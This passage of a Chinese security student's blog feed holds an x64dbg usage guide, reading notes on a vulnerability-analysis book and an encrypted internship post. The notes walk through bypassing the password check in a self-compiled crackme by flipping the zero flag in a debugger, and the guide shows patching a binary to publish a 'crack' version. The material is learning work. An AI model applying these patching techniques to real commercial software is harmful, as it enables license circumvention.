    <link href="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>x64dbg基础使用指南</p><span id="more"></span><h2 id="x64dbg的基本使用指南"><a href="#x64dbg的基本使用指南" class="headerlink" title="x64dbg的基本使用指南"></a>x64dbg的基本使用指南</h2><p>本篇是为了配合读书笔记，因为原书使用的都是32位的程序，但是目前都是x86-64的机器，所以就学习一下x64dbg。</p><p>在52的帖子里看到的一句话，现在还理解不透彻：<strong>破解的关键在于找到关键CALL</strong></p><p>本文参考文章：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1393075">1</a>，<a href="https://www.cnblogs.com/meowv/p/11428772.html">2</a></p><p>X64dbg更新很快，但作者对于帮助文档却惜墨如金，有很多实用的强大功能，都需要自己去摸索。<br>刚才提到寻找关键CALL，IDA虽然F5生成伪码功能强大，并且可以生成函数调用图，但对于复杂的调用看起来就很不直观。并且IDA只能单个文件静态分析，对于跨模块调用就无能为力。</p><h3 id="符号文件"><a href="#符号文件" class="headerlink" title="符号文件"></a>符号文件</h3><h4 id="什么是符号文件-pdb"><a href="#什么是符号文件-pdb" class="headerlink" title="什么是符号文件.pdb"></a>什么是符号文件.pdb</h4><p>​符号文件（Symbol Files）是一个数据信息文件。 它包含了应用程序二进制文件（比如：EXE、DLL等）调试信息，专门用来作调试之用，最终生成的可执行文件在运行时并不需要这个符号文件，但<strong>你的程序中所有的变量信息都记录在这个文件中。 所以调试应用程序时，这个文件是非常重要的</strong>。</p><h4 id="设置符号文件保存路径"><a href="#设置符号文件保存路径" class="headerlink" title="设置符号文件保存路径"></a>设置符号文件保存路径</h4><p>​符号文件通常很大，所以x64dbg自身不带有符号文件，需要自己手动下载和保存，但是默认设置相对路径不太方便，如果下载过符号文件，就会在同一文件夹下生成symbols文件夹，这样在x64dbg升级或者更换的时候非常不方便，所以自己新建一个专门的比较好</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-35-39.png" class=""><p>在选项中，杂项，设置本地符号路径</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-38-21.png" class=""><h4 id="使用符号文件"><a href="#使用符号文件" class="headerlink" title="使用符号文件"></a>使用符号文件</h4><p>很多情况下，x64dbg不会自动加载符号文件，大概率是防止同时加载过多导致程序崩溃，这时候就需要我们手动加载了</p><p>首先需要下载符号文件，打开符号页面，右键.dll，可以发现有下载选项，点击下载即可，但是由于是默认加载微软的符号服务器，所以建议打开代理下载😋</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-44-43.png" class=""><p>这里也可以选择下载所有dll的符号，下载到我们之前设置的文件夹下😁</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-48-49.png" class=""><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>通常打开一个程序的界面分为4块：</p><p>反汇编，寄存器，内存，系统栈</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-55-47.png" class=""><p>关于调试按钮，就自己看咯，在左上角那里，应该比较好理解的</p><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>搜索字符串：右键汇编代码区，搜索，选择搜索模块，选择搜索内容，单步运行到这里搜索当前模块的字符串内容结果，当然这个感觉没有IDA的好用😁，所以我一般是两个一起看</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-59-28.png" class=""><p>双击就可以到字符串在反汇编处</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_11-03-29.png" class=""><h4 id="编辑字符串"><a href="#编辑字符串" class="headerlink" title="编辑字符串"></a>编辑字符串</h4><p>下面学习如何修改字符串常量，首先在反汇编窗口定位到字符串位置，然后在该句信息的窗口双击虚拟内存地址，会x64dbg在内存窗口自动给你跳转到对应位置，</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-49-32.png" class=""><p>用鼠标选中需要编辑的位置，右键打开二进制编辑器</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-54-15.png" class=""><p>可以发现如果没有修改到原字符串的大小，是不会覆盖的，</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-56-18.png" class=""><p>关于这里为什么能在反汇编中动态改变，是因为反汇编区域默认是将在内存中内容读取并解析成相关的汇编代码</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-10-08.png" class=""><h4 id="一些配置"><a href="#一些配置" class="headerlink" title="一些配置"></a>一些配置</h4><p>在选项中，会有一些配置更改的设置，现在我们来看一看</p><ul><li>事件：就是x64dbg自动暂停的事件，这里也解释了我在阅读笔记1中的疑问，为什么会自动暂停，因为我之前安装的时候勾选了系统断点🤣，这里我们改回去，只保留在入口断点暂停</li></ul><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-40-13.png" class=""><ul><li>对于引擎和异常保持默认即可</li><li>反汇编：我这里仅修改了图中三处</li></ul><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-44-13.png" class=""><ul><li>杂项：可以将搜索引擎改为百度：<a href="https://www.baidu.com/s?wd=@topic">https://www.baidu.com/s?wd=@topic</a>  遇到不认识的函数选中，右键，符号名称帮助，直接进行查询。</li></ul><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>在帮助里面</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-48-38.png" class=""><h4 id="显示指令提示"><a href="#显示指令提示" class="headerlink" title="显示指令提示"></a>显示指令提示</h4><p>右键反汇编区，选择显示提示或隐藏</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-49-50.png" class=""><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>右键汇编区代码，然后选择补丁，修补文件即可发布crack版本，注意不要和源文件重名，快捷键Ctrl+P</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-06-36.png" class=""><p>可以发现已经修改了字符串</p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-08-34.png" class="">]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔1</title>
    <link href="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/"/>
    <url>/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔1"><a href="#0Day安全软件漏洞分析第2版阅读随笔1" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔1"></a>0Day安全软件漏洞分析第2版阅读随笔1</h1><p>《0Day安全软件漏洞分析第2版》，浅浅阅读了几章</p><span id="more"></span><h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章-基础知识"></a>第一章-基础知识</h2><h3 id="一些常识"><a href="#一些常识" class="headerlink" title="一些常识"></a>一些常识</h3><h4 id="公布漏洞的权威机构"><a href="#公布漏洞的权威机构" class="headerlink" title="公布漏洞的权威机构"></a>公布漏洞的权威机构</h4><p>（1） <a href="http://cve.mitre.org/">CVE (Common Vulnerabilities and Exposures)</a> 截至目前，这里收录了两万多个漏洞。CVE 会对每个公布的漏洞进行编号、审查。CVE 编号通常也是引用漏洞的标准方式。 </p><p>（2）<a href="http://www.cert.org/">CERT(Computer Emergency Response Team)</a> 计算机应急响应组往往会在第一时间跟进当前的严重漏洞，包括描述信息、POC 的发布链接、厂商的安全响应进度、 用户应该采取的临时性防范措施等。</p><h4 id="何为0Day"><a href="#何为0Day" class="headerlink" title="何为0Day"></a>何为0Day</h4><p>​        微软每个月第二周的星期二发布补丁，这一天通常被称为<code>Black Tuesday</code>，因为会有许多攻击者通宵达旦地去研究这些补丁 patch 了哪些漏洞，并写出 exploit。因为在补丁刚刚发布的一段时 间内，并非所有用户都能及时修复，故这种新公布的漏洞也有一定利用价值。有时把攻击这种 刚刚被 patch 过的漏洞称为 1 day 攻击（patch 发布后1天，叫做1day，5天叫做 5day，未发 patch 统称 0 day）</p><h4 id="必备工具"><a href="#必备工具" class="headerlink" title="必备工具"></a>必备工具</h4><h5 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h5><p>Ollydbg 是一个集成了反汇编分析、十六进制编辑、动态调试等多种功能于一身的功能强大的调试器。</p><p>但是仅支持动态调试32位的系统。</p><h5 id="IDAPro"><a href="#IDAPro" class="headerlink" title="IDAPro"></a>IDAPro</h5><p>IDA 好像是一张二进制的地图，通过它的标注功能可以迅速掌握大量汇编代码的架构，不至于在繁杂的二进制迷宫中迷失方向。目前版本的 IDA 甚至可以用图形方式显示出一个函数内部的执行流程。</p><h5 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h5><p>通过这款调试工具用户可以分析64位的应用，这是OllyDbg所不能做到的，它只能分析32位应用，所以想要分析64位应用，x64dbg是一款专门用于分析64位应用的调试软件。</p><h5 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a>二进制编辑器</h5><p>比较著名的十六进制编辑器包括 UltraEdit、Hex Workshop 和 WinHex 和 010 editor</p><h3 id="二进制文件概述"><a href="#二进制文件概述" class="headerlink" title="二进制文件概述"></a>二进制文件概述</h3><h4 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h4><p>​     <strong>PE，是<code>Portable Executable</code>的缩写，是<code>Win32</code>平台下可执行文件所遵守的数据格式。像<code>.exe</code>、<code>.dll</code>都是典型的PE文件。在文件执行时，操作系统会按照PE文件格式的约定去相应的地方调用资源，然后装入内存的不同区域。</strong></p><p>PE文件格式将可执行文件分为了几个数据节，一个典型的分节：</p><ul><li>.text: 由编译器产生，存放二进制的机器码，也是我们反汇编和调试的对象。</li><li>.data: 初始化的数据块，如宏定义、全局变量、静态变量等</li><li>.idata: 动态链接库等外来函数的信息</li><li>.rsrc: 程序资源，如图标、菜单等、</li></ul><p><strong>但我们需要注意的是，节可以被任意命名，并且代码的任意部分可以编译到PE的任意节中，如果可执行文件经过了“加壳”处理，PE 的节信息就会变得非常“古怪”。 在 Crack 和反病毒分析中需要经常处理这类古怪的 PE 文件。</strong></p><h4 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h4><p>在内核状态下，我们才能看到并调试物理内存。所以用户态下，我们用调试器看到的都是虚拟内存。Windows让所有的程序都认为自己拥有独立的4GB的内存，这当然是不可能的哈哈的😁</p><p>如下图展示：</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-21-19.png" class=""><p>这里书中有个比喻非常精妙：</p><ul><li>内存管理机制就像银行</li><li>进程=用户</li><li>内存管理器=银行</li><li>物理内存=现金</li><li>虚拟内存=存款</li><li>当进程（用户）需要使用物理内存（现金）的时候，它就会向银行（内存管理器）申请将虚拟内存（存款）映射为物理内存。</li></ul><h4 id="PE文件与虚拟内存间的映射"><a href="#PE文件与虚拟内存间的映射" class="headerlink" title="PE文件与虚拟内存间的映射"></a>PE文件与虚拟内存间的映射</h4><p>​        在静态调试中，我们看到的某个指令的位置，它是当前函数调用相对于磁盘文件得到的，也就是文件偏移。我们还需要知道这条指令在内存中的位置，即虚拟内存地址。</p><ul><li><strong>文件偏移地址</strong>：数据在PE文件中相对于文件开头的地址，<strong>这里的意思就是文件没有运行的时候</strong>。</li><li><strong>装载基址</strong>：PE装入内存时的基地址。默认情况下，EXE 文件在虚拟内存中的基地址是 0x00400000，DLL 文件是 0x10000000。这些位置可以通过修改编译选项更改。</li><li><strong>虚拟内存地址</strong>：PE文件中机制被装入内存后的地址。</li><li><strong>相对虚拟地址</strong>：内存地址相对于映射基址的偏移量。</li><li><strong>相对虚拟地址=虚拟内存地址-装载基址</strong></li></ul><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-58-02.png" class=""><p>​        <strong>操作系统在装载时基本上不会破坏程序的各种数据结构，所以文件地址和相对虚拟地址有很大的一致性，但是存在存放基本单位的差别。</strong></p><ul><li>文件数据按0x200字节为基本单位进行组织，PE数据节的大小始终是0x200的整数倍</li><li>内存数据按0x1000字节为基本单位进行组织，内存数据节的大小始终是0x1000的整数倍</li><li>这种由文件单位引起的<strong>节基址差</strong>称作节偏移，所以<strong>文件偏移地址=虚拟内存地址-装载基址-节地址差</strong></li></ul><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-23.png" class=""><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-38.png" class=""><h3 id="crack-me1"><a href="#crack-me1" class="headerlink" title="crack_me1"></a>crack_me1</h3><p>实验代码来源于原书</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"1234567"</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br><br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    { <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"please input password: "</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n\n"</span>); <br>        } <br>        <span class="hljs-keyword">else</span> <br>        { <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have passed the verification!\n"</span>); <br>            <span class="hljs-keyword">break</span>; <br>        } <br>    } <br>}<br></code></pre></td></tr></table></figure><p>使用命令<code>gcc -o crack_me.exe test.c</code>编译为64位的exe文件，当然如果你不是<code>x86-64</code>架构，那么命令有所变化，需要编为32位的程序😋。</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-35-25.png" class=""><p>接下来，使用IDA查看文件结构，这个时候假装我们不知道代码是自己写的😁</p><p>可以看到如下的文件结构：</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-37-10.png" class=""><p><strong>这里普及一下：红色的线表示if语句为真，绿色的线表示if语句结果为假</strong></p><p>然后可以发现，我们需要得到<code>Congratulation!</code>，那么用鼠标选中这条线，按空格切换到汇编代码：</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-41-37.png" class=""><p>使用了一个<code>jz</code>指令，这里我们需要知道这条指令由状态标志寄存器的ZF位决定，为1则跳转</p><p>ZF表示结果运算是否为0，如果为0则置1，反之置0。</p><p>所以这里我只需要让ZF=1即可</p><p>将程序拖进x64dbg里，然后程序会自动运行，这里读者不知道为什么会自动中断😂，这里直接继续运行</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-46-55.png" class=""><p>到需要我们输入密码即可，这里我们需要寻找之前分析出来的判断位置，然后下断点，修改标志位即可破解成功！</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-49-19.png" class=""><p>我们可以通过调用堆栈窗口，查看crack_me.exe的调用，然后查找出来位置，然后在即将跳转的那个指令处打下断点，可以发现这里<code>x64gbd</code>汇编出来是<code>je</code>指令，笔者这里还不清楚为什么会这样😭。当然这里效果和jz是一样，破解方法不变。</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-51-51.png" class=""><p>然后在terminal里输入密码，就会在断点处停下，在视图右侧会显示当前CPU的一些寄存器的状态，修改ZF=1再单步调试到输出即可。</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-55-57.png" class=""><p>破解成功！原密码为1234567</p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-59-46.png" class=""><p>第一章学习完毕！</p><p>之前有些基础，所以觉得不难，但是还是觉得这本书太适合入门了，写的很清晰明了的😍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大二暑期某乙方厂实习纪实</title>
    <link href="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/"/>
    <url>/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d53c0db07403a54b1b80bc967c746666f5acef46ac7a865bbfcaed709188dd1c">80f7af2430a3dce6996ee26d1569b2384cc039d4f110b0f2337be015a31257ed861b8cad3c2db875e3c4bbbb56240f27473970e83cd16b2ef402774b3da6fd1d24aadd77b96e8d323640aeb94066894a95f80d68d350d2b6b37dd0a0d6fd28d1523be06ddb0fac545080f75be7a3cca36a4a23730562653a6018db628ea43e1817f13e0a4e83de1b147f6ba5dcb21820da0843f3a46204a9ca182554f1dc2cb9349cca0c685ad6b41e628762647c6ed6a42074dec4d53af136d45ed6e2294bb2b79048387357d46d16d391be7359b09019c03d01012a74d536bce737cbed577ddf3a13ff553e86d7baa88a77cacfa30daad67ee59dce813b3c92ad71a00a0a17538b244f5ee9050b219ac578c29ef7834f5a9f1a9deb75e6148bca6317ccb52cf3231a8770a6f877438dbfcb325a77f56be8407384f8e5198c63b5ec7523fd5e53b48ab5da22d4d70701e917fd43170093ed9891c78fed3a923a150283365ddb8ffb270303c63d8c7c88c898f0faf0c82027489a5b647b801e2f4355a93e037103507dda8a86d2c468bba2bc94d990adb5d22cc82caec17d006bf749b8c62d52d91967479ad6b86ca2bff8d29bb4bfbefd85f69153cc8979acef7232f8520250e44f15ba4d647f90ae471c2ac181b3f8b486d06321d400f731815a11e9154a02a376d23e7b78eb431cbe3e3ba011a5eb401938cf848d42f4ef17172f5a6d8b59143abe872f9151e6d1a82adaf03b3513b2381ac314b0743c6c04e18c8e26a9a87b022f8be09976abd8d1c9bd17b89605118d094338768e336196ad6a068272bb65f2c4dc89aefd269198dab265549e195b2f472562dd105785fe1801293f1b28058f54beb20c23f5cf2f3f6079e3d0c95bb885a6b0667e6b0aebe84942c73c22259280200e37554032c5fbb1fa68c8da47da568ef0fab5ed0906f369222aea4adb5819a9cf845b6de3f9c8be4cd0c47a8b1d00c4a77df36995e176505a92e654e50b23dec69b0eafd6a82e737c0a1b62062db06a340ec3d4de361b29a6cf31c765a3952c321c54d5310dc8b96c00c32dda13245146a4019ecca637f02dc5642b7d8e21e317571094cbf9cfba97b81c8e70a41cbb2d4ef2e89aa91142061e1071e98834e906faea6f77e8cd6eb020358cfa5d7ef3741f291707cdb34457f6b03759b96bade81c601d3f6f47c2ed6d6f0185744026df2ee69a6e3f28ef229158cb6dd7b05b533b13ac2c7f3019a3b104b39521f6ce4e727f5e38765540700ec82edf3d801f43140270563119359fe093a21c41958f8895e16cb29af7d3f02487edaa2401f0bb7f4190057441de94718029ec5f0958a942845f3409738f553efd70b398f6f92b83fae7367789d164adb2a79d07728aef79fc0182c9870a9000fae9bc86e0cb06f41c0e51f8703c27bb681be3414621f9688e35110c2f84b98cfe8dbca1138ea6c0f4d5d6c0b5cfaef32be7bffbf7b25cbbc5fcf44f4bf77cfa45cb305cc8357da06f5e1eacf63dadc2ccb23febdf9d7a727f3d289d234ff4af12b06b949d6a6aa08f64235f3426b89c8625b96c41d1ac9b104b0998fba5ab0ca117e7d28974b040eddf067d283db90dfa2fb1cb48243ce470376af658e95acc8e6daa91d99cd4d17b3b117fbec82f1b0a1c8ccfe4c4b2bbe51ebc068b8eb9f2b48b06304eecf4f4b2c16d3f9f004953024c2960d8965cba1bf9a58172eabdd25bfff8eeab4df09d9b7654b1026d9e3fff9e5a8e69cd911f617c2684d83dc8082d17908c4dce3d2df96e857a206678c5b502da3d54ab06d9164a28d0d4e502a923784e0f22e5983088e8a1e126737d64a34a086551371c5c81e368402cff0302eb4ca035151b4675ae0e8d272812f560b981d61ea31e14640d94077018d1c8b551a2f21644930e4b9ca8b1394fac2bfb03b7ecf9e94530b2767a6a1d0a3ad064df589ddf784ef6d6a0ac2ee02a950febe475ffe1a2499650073de87e4df4201ea29e2c3ce48aab71daf7cc7ac5c633034bd83e0368707a3926f8c0b32ee9180c9b6b59d51956098e77398b7125e43cf7359f54a34b16d0d1cb1ae635846d3a60d026f30e74202b2ba11c485870f34c1958ee39e96c7e04eb7cfca35c241de41f73642e60aaf113cc3c8262416357ebd4e1346dd9f50a732bef960aae39290bc640eccfe1d97802879b54eac365d2deb540dacb8c527d939c03d4cd0db31cdf7727465744e2675b211d02602e892af08ada43c67f1032d1f46d9690f3e72894d52e1e14cf7c4d22566206dd48a95b0a17c2d4d7d6a1ffa1a95a8af80af034bb6ed6897e9239f5870bfa6ee4ea9336500a94073aae7bfd6ea95bd729dfcaa04dd2dd3c952b5b32bf34de1b37d5472bcaa2cfaa08a3bf38360c5efabb8893f709708e145f4e3ad72ee190634c38e6797c3480b23ea5988d1f05702999ab59d9355b2458e8ae82d17cae8637787c19490b0237f37d8760a74371b6f754a34c26b0926703655a2613008285c7704b3f59a8b8e7fb251c7c2e12cb160ccebc925d77a738a1b1f7188761afd931fa7d4eb71683ed797a70b4f2ec651a4f4b2d31d5cfc137eef20712aa078a6af43dc0010668725fd1d148b61a6b4d2afcdc741cbc1aa34c651cd17527841d28a2040d5145caf696303cae9907f7726bd20f6f27580e33a6cbc3d07ca98006ab3f972a4dca25fab57c2ece34886512851519a6857447ab7cb40d9922b9e9a1ce8a20f77cce77d32971f2fcdc2aa4d4d11adc54d343ffa0fc5a291886a7d8e41187e45e0e6e8c000b1e7bb588802d0d70adb26b6d4b558dffd695eff52d3a37f606e9422eb698725d3aee792be3386e04c03edf0b0c608e275274c3cf02b3350537b79407c7d1698dd55c82040072333eabc68c99e52aa1a2b581eea67adf8457f800195d26798c01ad5be4bda45c834884609bcb365f68ea920d663bf14f9017c5ce4483d9883e19d6fa83851cded3d161e88b507edd22da87a42b90e61abb37a8931c132a8a2d35ff7fddc5a22dc7314bf23ed20712b61d23620205a30ad573823c8fa9a70644ec8dbb79ce8154dc3a3ad87f24385d380f54b948e4f08036985bf56889cf87cce87f060556ea9a13faf724ba418628e064ef4f43d01efaeb2a33135f3a2cfbd11332096d13908359946ce3fe9cb4197beaefe1a01fb28bd7aba0b8bc24f216ca44ec689ed18025a1a5152a9007052c5968c7b2bba856c351f909fae8182d84ddacba7cf12c4755c5e2a1acf29a1032663bb498ed38f76f477011f1bdaf0f3da29a335bd3525035bbe5c2ad61acc348ebc0ddc66cb053a361308057b692a2192246c4aa01034c478ce3d0103656e382c63ef90b27753cce5f23bfbedf662d8a6a42ea3a4f35c94f721671b5412546727a2ed4419218fdc2461ac38859db155448ab88a48550cedf41d9b55154c08edcfecf5825509645d21f9103728577ef59a4d722b1bbb7eaa9de7f8cf82874274e3c1c28fe7c8758e2a1b8614a6fc96b04a37b2c62af5213739ea712d4cab72815ce3f636abf3125fbe6cf1f1c28b13e2249c92a7d17527680ca6491f142de5f48b2fa6f31d55f135047f00bcd5a9bbb950435184945b5b7044e0f840fb5e5f00868f1ef6076beff1751386487e57d94